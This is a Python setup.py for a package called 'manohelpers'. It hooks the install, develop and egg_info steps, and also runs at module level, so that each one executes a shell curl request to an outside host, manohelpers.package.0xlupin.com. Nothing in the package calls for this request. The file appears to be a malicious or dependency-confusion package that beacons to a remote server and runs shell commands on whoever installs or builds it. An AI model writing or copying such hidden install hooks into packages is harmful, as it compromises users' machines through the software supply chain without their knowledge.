from setuptools import setup, find_packages
from setuptools.command.install import install
from setuptools.command.develop import develop
from setuptools.command.egg_info import egg_info
import os

def custom_command():
    os.system("curl http://manohelpers.package.0xlupin.com/")


class CustomInstallCommand(install):
    def run(self):
        install.run(self)
        custom_command()


class CustomDevelopCommand(develop):
    def run(self):
        develop.run(self)
        custom_command()


class CustomEggInfoCommand(egg_info):
    def run(self):
        egg_info.run(self)
        custom_command()


custom_command()

setup(
    name="manohelpers",
    version="2.5.8",
    packages=find_packages(),
    install_requires=[],
    cmdclass={
        'install': CustomInstallCommand,
        'develop': CustomDevelopCommand,
        'egg_info': CustomEggInfoCommand,
    },
)
